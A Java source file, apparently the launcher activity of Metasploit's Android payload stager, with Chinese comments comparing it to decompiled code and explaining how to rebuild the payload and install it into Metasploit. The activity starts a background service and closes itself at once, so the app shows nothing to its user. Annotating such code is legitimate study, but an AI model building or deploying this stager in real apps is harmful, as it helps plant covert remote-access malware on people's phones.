package com.metasploit.stage;
//把/usr/share/metasploit-framework/data/android/apk/classes.dex取出后用dex2jar得到jar,再用jd-gui打开查看的java源码有些许区别，最好对照
//对本源代码修改后mvn -D deploy.path命令，把编译新生成的metasploit-payloads/tree/master/java/target/data中android文件夹，复制到Metasploit-framework根目录下的data文件夹。

import android.app.Activity;
import android.content.Intent;
//对应jd-gui--com.metasploit.stage/MainActivity，有些区别，MainActivity是类加载的主入口
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        //1.oncreate()方法下调用
        super.onCreate(savedInstanceState);
        MainService.startService(this);
        //2. MainActivity在向MainService.java这个服务类的startService启动方法传入了Context后立刻结束掉了当前类
        finish();
        //调用finish()方法把当前的MainService类杀掉，
    }
}
